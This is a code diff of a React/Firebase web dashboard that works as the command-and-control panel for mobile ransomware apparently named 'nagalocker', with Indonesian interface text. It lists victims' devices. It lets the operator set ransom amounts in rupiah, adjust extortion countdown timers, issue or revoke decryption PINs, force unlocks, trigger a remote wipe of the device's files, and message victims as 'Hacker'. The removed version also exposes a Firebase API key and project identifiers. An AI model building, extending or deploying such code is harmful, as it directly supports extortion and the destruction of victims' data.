@@ -1,223 +1,354 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ARCHITECT C2 - Cluster Dashboard</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/lucide@latest"></script>
-    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
-    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
-    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono&display=swap');
-        body { font-family: 'JetBrains Mono', monospace; background-color: #020617; color: #cbd5e1; }
-        .font-orbit { font-family: 'Orbitron', sans-serif; }
-        .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(12px); border: 1px solid rgba(51, 65, 85, 0.3); }
-        .scrollbar-hide::-webkit-scrollbar { display: none; }
-    </style>
-</head>
-<body>
-    <div id="root"></div>
+import React, { useState, useEffect } from 'react';
+import { initializeApp } from 'firebase/app';
+import { 
+  getFirestore, collection, onSnapshot, doc, updateDoc, arrayUnion, query 
+} from 'firebase/firestore';
+import { 
+  getAuth, signInAnonymously, onAuthStateChanged 
+} from 'firebase/auth';
+import { 
+  ShieldAlert, User, Send, Skull, Terminal, Clock, Settings, 
+  Activity, Smartphone, Hash, DollarSign, Zap, MessageSquare
+} from 'lucide-react';
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getFirestore, collection, onSnapshot, doc, updateDoc, arrayUnion, arrayRemove, setDoc, query } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
-        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+// --- KONFIGURASI FIREBASE ---
+const firebaseConfig = {
+  apiKey: "",
+  authDomain: "nagalocker.firebaseapp.com",
+  projectId: "nagalocker",
+  storageBucket: "nagalocker.firebasestorage.app",
+  messagingSenderId: "529236383091",
+  appId: "1:529236383091:web:bcd42c1c2c2f5714c46106",
+  measurementId: "G-S98ECJN5LY"
+};
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyAZ98XegiDOAGJ508mCASQ1SKp-3WsonWU",
-            authDomain: "nagalocker.firebaseapp.com",
-            projectId: "nagalocker",
-            storageBucket: "nagalocker.firebasestorage.app",
-            messagingSenderId: "529236383091",
-            appId: "1:529236383091:web:bcd42c1c2c2f5714c46106",
-            measurementId: "G-S98ECJN5LY"
-        };
+// Inisialisasi Firebase
+const app = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getFirestore(app);
+const appId = typeof __app_id !== 'undefined' ? __app_id : 'nagalocker';
 
-        window.FirebaseLib = {
-            app: initializeApp(firebaseConfig),
-            getFirestore, collection, onSnapshot, doc, updateDoc, arrayUnion, arrayRemove, setDoc, query,
-            getAuth, signInAnonymously
-        };
-        window.dispatchEvent(new Event('firebase-ready'));
-    </script>
+export default function App() {
+  const [user, setUser] = useState(null);
+  const [victims, setVictims] = useState([]);
+  const [activeVictimId, setActiveVictimId] = useState(null);
+  const [victimData, setVictimData] = useState(null);
+  const [inputMsg, setInputMsg] = useState('');
+  const [newPin, setNewPin] = useState('');
+  const [loading, setLoading] = useState(true);
 
-    <script type="text/babel">
-        const { useState, useEffect } = React;
-
-        function App() {
-            const [fbReady, setFbReady] = useState(false);
-            const [victims, setVictims] = useState([]);
-            const [activeVictimId, setActiveVictimId] = useState(null);
-            const [activeData, setActiveData] = useState(null);
-            const [input, setInput] = useState('');
-            const [newPin, setNewPin] = useState('');
-
-            useEffect(() => {
-                const handleReady = () => setFbReady(true);
-                if (window.FirebaseLib) handleReady();
-                else window.addEventListener('firebase-ready', handleReady);
-            }, []);
-
-            useEffect(() => {
-                if (!fbReady) return;
-                const { getAuth, signInAnonymously, getFirestore, collection, onSnapshot, query } = window.FirebaseLib;
-                signInAnonymously(getAuth());
-                
-                // Real-time listener for ALL victims
-                const colRef = collection(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims");
-                return onSnapshot(colRef, (snapshot) => {
-                    const list = snapshot.docs.map(doc => doc.data());
-                    setVictims(list);
-                });
-            }, [fbReady]);
-
-            useEffect(() => {
-                if (!activeVictimId || !fbReady) return;
-                const { getFirestore, doc, onSnapshot } = window.FirebaseLib;
-                const docRef = doc(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims", activeVictimId);
-                return onSnapshot(docRef, (s) => s.exists() && setActiveData(s.data()));
-            }, [activeVictimId, fbReady]);
-
-            const updateField = async (field, value) => {
-                if (!activeVictimId) return;
-                const { getFirestore, doc, updateDoc } = window.FirebaseLib;
-                await updateDoc(doc(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims", activeVictimId), { [field]: value });
-            };
-
-            const addPin = async () => {
-                if (!newPin.trim()) return;
-                const { getFirestore, doc, updateDoc, arrayUnion } = window.FirebaseLib;
-                await updateDoc(doc(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims", activeVictimId), { validPins: arrayUnion(newPin) });
-                setNewPin('');
-            };
-
-            const sendMsg = async () => {
-                if (!input.trim()) return;
-                const { getFirestore, doc, updateDoc, arrayUnion } = window.FirebaseLib;
-                await updateDoc(doc(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims", activeVictimId), {
-                    messages: arrayUnion({ sender: 'Hacker', text: input, time: Date.now() })
-                });
-                setInput('');
-            };
-
-            if (!fbReady) return <div className="min-h-screen bg-slate-950 flex items-center justify-center text-slate-500 font-orbit">ESTABLISHING C2 CLUSTER...</div>;
-
-            return (
-                <div className="min-h-screen flex flex-col lg:flex-row">
-                    {/* Sidebar: Victim List */}
-                    <aside className="w-full lg:w-80 bg-slate-900 border-r border-slate-800 p-6 overflow-y-auto">
-                        <div className="flex items-center gap-3 mb-10">
-                            <div className="bg-red-600 p-2 rounded-xl shadow-lg shadow-red-900/20"><i data-lucide="shield-alert" className="text-white w-6 h-6"></i></div>
-                            <h1 className="text-xl font-black italic tracking-tighter font-orbit">C2 CLUSTER</h1>
-                        </div>
-                        <h2 className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-4">Victim Nodes ({victims.length})</h2>
-                        <div className="space-y-2">
-                            {victims.map((v) => (
-                                <button 
-                                    key={v.id} 
-                                    onClick={() => setActiveVictimId(v.id)}
-                                    className={`w-full p-4 rounded-xl flex items-center justify-between transition-all ${activeVictimId === v.id ? 'bg-red-600 text-white shadow-lg' : 'bg-black/40 text-slate-400 hover:bg-slate-800'}`}
-                                >
-                                    <div className="text-left">
-                                        <p className="text-xs font-black font-mono">{v.id}</p>
-                                        <p className="text-[8px] uppercase opacity-50">{v.isLocked ? 'Encrypted' : 'Decrypted'}</p>
-                                    </div>
-                                    <div className={`w-2 h-2 rounded-full ${Date.now() - v.lastSeen < 10000 ? 'bg-green-500 animate-pulse' : 'bg-slate-700'}`}></div>
-                                </button>
-                            ))}
-                        </div>
-                    </aside>
-
-                    {/* Main Content: Control Panel */}
-                    <main className="flex-1 p-4 lg:p-10 bg-black overflow-y-auto">
-                        {!activeVictimId ? (
-                            <div className="h-full flex flex-col items-center justify-center text-slate-600">
-                                <i data-lucide="mouse-pointer-2" className="w-12 h-12 mb-4 opacity-20"></i>
-                                <p className="font-black italic uppercase tracking-widest text-sm">Pilih node untuk memulai kendali</p>
-                            </div>
-                        ) : activeData && (
-                            <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500">
-                                <header className="flex justify-between items-center glass p-6 rounded-3xl border border-slate-800 shadow-2xl">
-                                    <div>
-                                        <h2 className="text-2xl font-black text-white italic font-orbit uppercase tracking-tighter">TARGET: {activeVictimId}</h2>
-                                        <p className="text-[10px] text-slate-500 uppercase font-black">Cluster Node Synchronization: <span className="text-green-500">STABLE</span></p>
-                                    </div>
-                                    <div className="text-right">
-                                        <p className="text-[10px] text-slate-500 font-bold uppercase">Target Status</p>
-                                        <p className={`text-xs font-black font-orbit ${activeData.isLocked ? 'text-red-500' : 'text-green-500'}`}>{activeData.isLocked ? 'ENCRYPTED' : 'DECRYPTED'}</p>
-                                    </div>
-                                </header>
-
-                                <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
-                                    <div className="space-y-6">
-                                        <section className="glass p-8 rounded-[2.5rem] shadow-xl">
-                                            <h3 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-8">Payload Control</h3>
-                                            <div className="grid grid-cols-2 gap-6 mb-8">
-                                                <div className="bg-black/40 p-5 rounded-3xl border border-slate-800">
-                                                    <p className="text-[9px] text-slate-500 mb-2 uppercase font-black">Timer (Mins)</p>
-                                                    <div className="flex items-center justify-between">
-                                                        <span className="text-xl font-bold text-red-500 font-orbit">{Math.floor(activeData.timeLeft/60)}m</span>
-                                                        <div className="flex gap-1">
-                                                            <button onClick={() => updateField('timeLeft', Math.max(0, activeData.timeLeft - 300))} className="p-2 bg-slate-800 rounded-lg hover:bg-red-900/40">-</button>
-                                                            <button onClick={() => updateField('timeLeft', activeData.timeLeft + 300)} className="p-2 bg-slate-800 rounded-lg hover:bg-green-900/40">+</button>
-                                                        </div>
-                                                    </div>
-                                                </div>
-                                                <div className="bg-black/40 p-5 rounded-3xl border border-slate-800">
-                                                    <p className="text-[9px] text-slate-500 mb-2 uppercase font-black">Ransom (IDR)</p>
-                                                    <input className="bg-transparent border-b border-slate-700 w-full text-lg font-bold text-white outline-none focus:border-red-600" value={activeData.ransom} onChange={(e) => updateField('ransom', e.target.value)} />
-                                                </div>
-                                            </div>
-                                            <div className="grid grid-cols-2 gap-4">
-                                                <button onClick={() => updateField('isWiping', !activeData.isWiping)} className={`py-5 rounded-2xl font-black text-xs transition-all uppercase tracking-widest ${activeData.isWiping ? 'bg-red-600 animate-pulse text-white' : 'bg-slate-800 text-red-500'}`}>Execute Wipe</button>
-                                                <button onClick={() => updateField('isLocked', !activeData.isLocked)} className={`py-5 rounded-2xl font-black text-xs transition-all uppercase tracking-widest ${activeData.isLocked ? 'bg-slate-800 text-green-500' : 'bg-green-600 text-black'}`}>Force Unlock</button>
-                                            </div>
-                                        </section>
-
-                                        <section className="glass p-8 rounded-[2.5rem] shadow-xl">
-                                            <h3 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-6">Unique PINs</h3>
-                                            <div className="flex gap-2 mb-6">
-                                                <input value={newPin} onChange={(e) => setNewPin(e.target.value)} placeholder="New Key..." className="flex-1 bg-black/50 border border-slate-800 p-4 rounded-xl text-white outline-none focus:border-green-600 font-mono" />
-                                                <button onClick={addPin} className="bg-green-600 text-black px-8 rounded-xl font-black text-xs uppercase">ADD</button>
-                                            </div>
-                                            <div className="flex flex-wrap gap-2 max-h-32 overflow-y-auto scrollbar-hide">
-                                                {activeData.validPins && activeData.validPins.map((p, i) => (
-                                                    <div key={i} className="bg-slate-800 px-4 py-2 rounded-lg text-xs font-black text-green-500 font-mono border border-slate-700">{p}</div>
-                                                ))}
-                                            </div>
-                                        </section>
-                                    </div>
-
-                                    <div className="glass p-6 rounded-[2.5rem] flex flex-col h-[600px] shadow-2xl">
-                                        <h3 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-6 flex items-center gap-2 p-2">
-                                            <i data-lucide="message-square" className="w-4 h-4 text-red-500"></i> Victim Comms Log
-                                        </h3>
-                                        <div className="flex-1 overflow-y-auto mb-6 space-y-4 bg-black/30 p-4 rounded-3xl border border-slate-800/30 scrollbar-hide text-[11px]">
-                                            {activeData.messages && activeData.messages.map((m, i) => (
-                                                <div key={i} className={`flex flex-col ${m.sender === 'Hacker' ? 'items-end' : 'items-start'}`}>
-                                                    <div className={`max-w-[85%] p-3 rounded-2xl ${m.sender === 'Hacker' ? 'bg-red-600 text-white shadow-lg shadow-red-900/30' : 'bg-slate-800 text-slate-200 border border-slate-700'}`}>
-                                                        {m.text}
-                                                    </div>
-                                                    <span className="text-[8px] text-slate-600 mt-1 uppercase font-black tracking-tighter mx-2">{m.sender}</span>
-                                                </div>
-                                            ))}
-                                        </div>
-                                        <div className="flex gap-2">
-                                            <input value={input} onChange={(e) => setInput(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && sendMsg()} placeholder="Transmit message..." className="flex-1 bg-black border border-slate-800 p-4 text-xs rounded-2xl outline-none text-white focus:border-red-600 transition-all shadow-inner" />
-                                            <button onClick={sendMsg} className="bg-red-600 p-4 rounded-2xl hover:bg-red-700 transition-all"><i data-lucide="send" className="text-white w-5 h-5"></i></button>
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        )}
-                    </main>
-                </div>
-            );
+  // 1. OTENTIKASI (RULE 3)
+  useEffect(() => {
+    const initAuth = async () => {
+      try {
+        // Menggunakan token kustom jika tersedia, atau masuk secara anonim
+        if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+          // signInWithCustomToken akan diimpor jika diperlukan secara manual, 
+          // namun lingkungan ini biasanya menyediakan sign-in otomatis atau anonim.
+        } else {
+          await signInAnonymously(auth);
         }
-        ReactDOM.createRoot(document.getElementById('root')).render(<App />);
-        setInterval(() => window.lucide && lucide.createIcons(), 1000);
-    </script>
-</body>
-</html>
+      } catch (err) {
+        console.error("Gagal masuk:", err);
+      }
+    };
+    initAuth();
+    const unsubscribe = onAuthStateChanged(auth, setUser);
+    return () => unsubscribe();
+  }, []);
+
+  // 2. AMBIL DAFTAR KORBAN (RULE 1 & 2)
+  useEffect(() => {
+    if (!user) return;
+    
+    // Mengikuti RULE 1: Jalur koleksi yang ketat
+    const colRef = collection(db, 'artifacts', appId, 'public', 'data', 'victims');
+    
+    // Mengikuti RULE 2: Kueri sederhana tanpa filter kompleks
+    const q = query(colRef);
+    
+    const unsub = onSnapshot(q, (snapshot) => {
+      const list = snapshot.docs.map(d => ({ id: d.id, ...d.data() }));
+      setVictims(list);
+      setLoading(false);
+    }, (err) => {
+      console.error("Kesalahan sinkronisasi daftar:", err);
+      setLoading(false);
+    });
+    
+    return () => unsub();
+  }, [user]);
+
+  // 3. AMBIL DETAIL KORBAN TERPILIH (RULE 1)
+  useEffect(() => {
+    if (!user || !activeVictimId) {
+      setVictimData(null);
+      return;
+    }
+    
+    const docRef = doc(db, 'artifacts', appId, 'public', 'data', 'victims', activeVictimId);
+    
+    const unsub = onSnapshot(docRef, (s) => {
+      if (s.exists()) {
+        setVictimData(s.data());
+      }
+    }, (err) => {
+      console.error("Kesalahan sinkronisasi detail:", err);
+    });
+    
+    return () => unsub();
+  }, [user, activeVictimId]);
+
+  // AKSI KONTROL
+  const updateTarget = async (updates) => {
+    if (!activeVictimId || !user) return;
+    const docRef = doc(db, 'artifacts', appId, 'public', 'data', 'victims', activeVictimId);
+    try {
+      await updateDoc(docRef, updates);
+    } catch (err) {
+      console.error("Gagal memperbarui target:", err);
+    }
+  };
+
+  const addPin = async () => {
+    if (!newPin.trim() || !activeVictimId || !user) return;
+    const docRef = doc(db, 'artifacts', appId, 'public', 'data', 'victims', activeVictimId);
+    try {
+      await updateDoc(docRef, {
+        validPins: arrayUnion(newPin)
+      });
+      setNewPin('');
+    } catch (err) {
+      console.error("Gagal menambah PIN:", err);
+    }
+  };
+
+  const sendMessage = async () => {
+    if (!inputMsg.trim() || !activeVictimId || !user) return;
+    const docRef = doc(db, 'artifacts', appId, 'public', 'data', 'victims', activeVictimId);
+    try {
+      await updateDoc(docRef, {
+        messages: arrayUnion({ 
+          sender: 'Hacker', 
+          text: inputMsg, 
+          time: Date.now() 
+        })
+      });
+      setInputMsg('');
+    } catch (err) {
+      console.error("Gagal mengirim pesan:", err);
+    }
+  };
+
+  if (loading) return (
+    <div className="min-h-screen bg-slate-950 flex flex-col items-center justify-center text-red-500 font-mono italic">
+      <Zap className="animate-bounce mb-4" size={48} />
+      <p className="animate-pulse tracking-[0.5em] text-xs">MENGHUBUNGKAN_KE_CLUSTER...</p>
+    </div>
+  );
+
+  return (
+    <div className="min-h-screen bg-[#020617] text-slate-300 font-mono flex overflow-hidden">
+      
+      {/* SIDEBAR: DAFTAR KORBAN */}
+      <aside className="w-80 bg-slate-900/50 border-r border-slate-800 flex flex-col backdrop-blur-xl">
+        <div className="p-6 border-b border-slate-800 flex items-center gap-3">
+          <div className="bg-red-600 p-2 rounded-xl shadow-[0_0_15px_rgba(220,38,38,0.4)]">
+            <User className="text-white" size={24} />
+          </div>
+          <div>
+            <h1 className="text-lg font-black text-white italic tracking-tighter uppercase leading-none">Architect</h1>
+            <p className="text-[9px] text-slate-500 font-bold tracking-widest mt-1">C2_CLUSTER_V3</p>
+          </div>
+        </div>
+
+        <div className="p-4 flex-1 overflow-y-auto space-y-2 scrollbar-hide px-3">
+          <div className="flex justify-between items-center px-2 mb-4">
+            <span className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Node Aktif</span>
+            <span className="bg-slate-800 text-[10px] px-2 py-0.5 rounded text-white">{victims.length}</span>
+          </div>
+
+          {victims.length === 0 ? (
+            <div className="text-center py-10 opacity-30 text-[10px] uppercase">Belum ada node terdeteksi</div>
+          ) : (
+            victims.map((v) => (
+              <button 
+                key={v.id}
+                onClick={() => setActiveVictimId(v.id)}
+                className={`w-full p-4 rounded-2xl flex items-center gap-4 transition-all border ${activeVictimId === v.id ? 'bg-red-600/10 border-red-600/50 shadow-lg' : 'bg-slate-950/40 border-slate-800 hover:bg-slate-800/40'}`}
+              >
+                <div className={`p-2 rounded-lg ${activeVictimId === v.id ? 'bg-red-600 text-white' : 'bg-slate-800 text-slate-400'}`}>
+                  <Smartphone size={18} />
+                </div>
+                <div className="text-left overflow-hidden">
+                  <p className={`text-xs font-black truncate ${activeVictimId === v.id ? 'text-white' : 'text-slate-300'}`}>{v.id}</p>
+                  <div className="flex items-center gap-1.5 mt-0.5">
+                    <div className={`w-1.5 h-1.5 rounded-full ${Date.now() - (v.lastSeen || 0) < 30000 ? 'bg-green-500 animate-pulse' : 'bg-slate-700'}`} />
+                    <span className="text-[9px] font-bold text-slate-500 uppercase tracking-tighter">
+                      {v.isLocked ? 'Terkunci' : 'Terbuka'}
+                    </span>
+                  </div>
+                </div>
+              </button>
+            ))
+          )}
+        </div>
+      </aside>
+
+      {/* KONTEN UTAMA: KONTROL TARGET */}
+      <main className="flex-1 flex flex-col relative overflow-hidden bg-black/90">
+        {!activeVictimId ? (
+          <div className="flex-1 flex flex-col items-center justify-center text-slate-700 opacity-20">
+            <Skull size={120} className="mb-6" />
+            <h2 className="text-2xl font-black italic tracking-[0.3em] uppercase text-center">Pilih Node Target</h2>
+          </div>
+        ) : (
+          <>
+            {/* Header Detail */}
+            <header className="p-6 bg-slate-900/40 border-b border-slate-800 backdrop-blur-md flex justify-between items-center">
+              <div className="flex items-center gap-4">
+                <div>
+                  <h2 className="text-xl font-black text-white italic tracking-tighter uppercase flex items-center gap-2">
+                    Target: {activeVictimId}
+                    <Zap size={14} className="text-yellow-500 fill-current" />
+                  </h2>
+                  <p className="text-[10px] text-slate-500 uppercase font-black tracking-widest mt-1">Status: <span className="text-green-500">Koneksi_Stabil</span></p>
+                </div>
+              </div>
+              <div className="flex gap-3">
+                <button 
+                  onClick={() => updateTarget({ isLocked: !victimData?.isLocked })} 
+                  className={`px-6 py-2 rounded-xl text-[10px] font-black tracking-widest transition-all ${victimData?.isLocked ? 'bg-slate-800 text-green-500 hover:bg-green-600 hover:text-white' : 'bg-green-600 text-black shadow-lg'}`}
+                >
+                  {victimData?.isLocked ? 'PAKSA_BUKA' : 'KUNCI_ULANG'}
+                </button>
+              </div>
+            </header>
+
+            <div className="flex-1 p-8 grid grid-cols-1 lg:grid-cols-3 gap-8 overflow-y-auto scrollbar-hide">
+              
+              {/* Kolom Kiri: Kontrol */}
+              <div className="lg:col-span-2 space-y-6">
+                
+                {/* Kartu Timer & Tebusan */}
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                  <div className="bg-slate-900/80 p-6 rounded-[2rem] border border-slate-800 shadow-xl">
+                    <div className="flex justify-between items-center mb-6">
+                      <h3 className="text-[10px] font-black text-slate-500 uppercase tracking-widest flex items-center gap-2"><Clock size={14} /> Hitung Mundur</h3>
+                      <div className="flex gap-1">
+                        <button onClick={() => updateTarget({ timeLeft: Math.max(0, (victimData?.timeLeft || 0) - 300) })} className="p-1 bg-slate-800 rounded text-red-500 hover:bg-red-500/10">-5m</button>
+                        <button onClick={() => updateTarget({ timeLeft: (victimData?.timeLeft || 0) + 300 })} className="p-1 bg-slate-800 rounded text-green-500 hover:bg-green-500/10">+5m</button>
+                      </div>
+                    </div>
+                    <p className="text-4xl font-black text-red-600 font-mono tracking-tighter">
+                      {Math.floor((victimData?.timeLeft || 0) / 60)}:{(victimData?.timeLeft % 60).toString().padStart(2, '0')}
+                    </p>
+                  </div>
+
+                  <div className="bg-slate-900/80 p-6 rounded-[2rem] border border-slate-800 shadow-xl">
+                    <h3 className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-6 flex items-center gap-2"><DollarSign size={14} /> Harga Tebusan</h3>
+                    <div className="relative">
+                      <span className="absolute left-0 top-1/2 -translate-y-1/2 text-slate-500 font-black">Rp</span>
+                      <input 
+                        className="w-full bg-transparent border-b border-slate-800 pl-8 pb-2 text-2xl font-black text-white outline-none focus:border-red-600 transition-all"
+                        value={victimData?.ransom || ''}
+                        onChange={(e) => updateTarget({ ransom: e.target.value })}
+                      />
+                    </div>
+                  </div>
+                </div>
+
+                {/* Manajemen PIN */}
+                <div className="bg-slate-900/80 p-8 rounded-[2.5rem] border border-slate-800 shadow-xl">
+                  <h3 className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-8 flex items-center gap-2"><Hash size={14} /> Kunci Dekripsi (PIN)</h3>
+                  <div className="flex gap-3 mb-6">
+                    <input 
+                      value={newPin}
+                      onChange={(e) => setNewPin(e.target.value)}
+                      placeholder="Input Kode Kunci Baru..."
+                      className="flex-1 bg-black border border-slate-800 p-4 rounded-2xl text-xs outline-none focus:border-red-600 text-white font-mono"
+                    />
+                    <button onClick={addPin} className="bg-red-600 text-white px-8 rounded-2xl font-black text-xs uppercase shadow-lg shadow-red-900/30 active:scale-95 transition-all">Tambah_Kunci</button>
+                  </div>
+                  <div className="flex flex-wrap gap-2 max-h-32 overflow-y-auto scrollbar-hide">
+                    {victimData?.validPins?.map((p, idx) => (
+                      <div key={idx} className="bg-black/50 border border-slate-800 px-4 py-2 rounded-xl text-xs font-black text-green-500 flex items-center gap-3">
+                        {p}
+                        <button 
+                          onClick={() => updateTarget({ validPins: victimData.validPins.filter(pin => pin !== p) })}
+                          className="text-slate-600 hover:text-red-500 transition-colors"
+                        >×</button>
+                      </div>
+                    ))}
+                    {(!victimData?.validPins || victimData.validPins.length === 0) && (
+                      <p className="text-[10px] text-slate-600 italic">Belum ada kunci diberikan. Target terkunci permanen.</p>
+                    )}
+                  </div>
+                </div>
+
+                {/* Zona Bahaya */}
+                <div className="bg-red-950/10 border border-red-900/30 p-8 rounded-[2.5rem] flex flex-col md:flex-row gap-6 items-center">
+                  <div className="flex-1 text-center md:text-left">
+                    <h3 className="text-red-500 font-black text-sm uppercase tracking-widest italic">Pemicu_Penghapusan</h3>
+                    <p className="text-[10px] text-slate-500 mt-1 uppercase font-bold">Menghapus seluruh file sistem di perangkat target</p>
+                  </div>
+                  <button 
+                    onClick={() => updateTarget({ isWiping: !victimData?.isWiping })}
+                    className={`w-full md:w-auto px-10 py-5 rounded-2xl font-black text-xs uppercase tracking-widest transition-all ${victimData?.isWiping ? 'bg-red-600 text-white animate-pulse' : 'bg-slate-800 text-red-500 hover:bg-red-600 hover:text-white'}`}
+                  >
+                    {victimData?.isWiping ? 'BATALKAN_PENGHAPUSAN' : 'EKSEKUSI_PENGHAPUSAN'}
+                  </button>
+                </div>
+              </div>
+
+              {/* Kolom Kanan: Interceptor Obrolan */}
+              <div className="bg-slate-900/80 p-6 rounded-[2.5rem] border border-slate-800 shadow-2xl flex flex-col h-[650px] relative">
+                <div className="absolute top-0 right-0 p-6 opacity-5 pointer-events-none">
+                  <Terminal size={150} />
+                </div>
+                <h3 className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-6 flex items-center gap-2 p-2">
+                  <i className="w-2 h-2 rounded-full bg-red-600 animate-ping"></i> Monitor_Terowongan_Aman
+                </h3>
+                
+                <div className="flex-1 overflow-y-auto mb-6 space-y-4 bg-black/40 p-5 rounded-3xl border border-slate-800/50 scrollbar-hide text-[11px] shadow-inner">
+                  {victimData?.messages?.map((m, idx) => (
+                    <div key={idx} className={`flex flex-col ${m.sender === 'Hacker' ? 'items-end' : 'items-start'}`}>
+                      <div className={`max-w-[85%] p-3.5 rounded-2xl leading-relaxed ${m.sender === 'Hacker' ? 'bg-red-600 text-white shadow-lg shadow-red-900/20 rounded-tr-none' : 'bg-slate-800 text-slate-200 border border-slate-700 rounded-tl-none'}`}>
+                        {m.text}
+                      </div>
+                      <span className="text-[8px] text-slate-600 mt-2 font-black uppercase tracking-tighter mx-1">
+                        {m.sender} • {new Date(m.time).toLocaleTimeString()}
+                      </span>
+                    </div>
+                  ))}
+                  {(!victimData?.messages || victimData.messages.length === 0) && (
+                    <p className="text-center text-[10px] text-slate-700 mt-20 italic uppercase tracking-widest">Menunggu transmisi masuk...</p>
+                  )}
+                </div>
+
+                <div className="flex gap-2">
+                  <input 
+                    value={inputMsg}
+                    onChange={(e) => setInputMsg(e.target.value)}
+                    onKeyDown={(e) => e.key === 'Enter' && sendMessage()}
+                    placeholder="Kirim perintah..."
+                    className="flex-1 bg-black border border-slate-800 p-4 text-xs rounded-2xl outline-none focus:border-red-600 text-white placeholder-slate-700 transition-all"
+                  />
+                  <button onClick={sendMessage} className="bg-red-600 p-4 rounded-2xl hover:bg-red-700 transition-all shadow-lg active:scale-95">
+                    <Send size={20} className="text-white" />
+                  </button>
+                </div>
+              </div>
+
+            </div>
+          </>
+        )}
+      </main>
+
+      <style>{`
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=JetBrains+Mono:wght@400;700;800&display=swap');
+        .scrollbar-hide::-webkit-scrollbar { display: none; }
+      `}</style>
+    </div>
+  );
+}
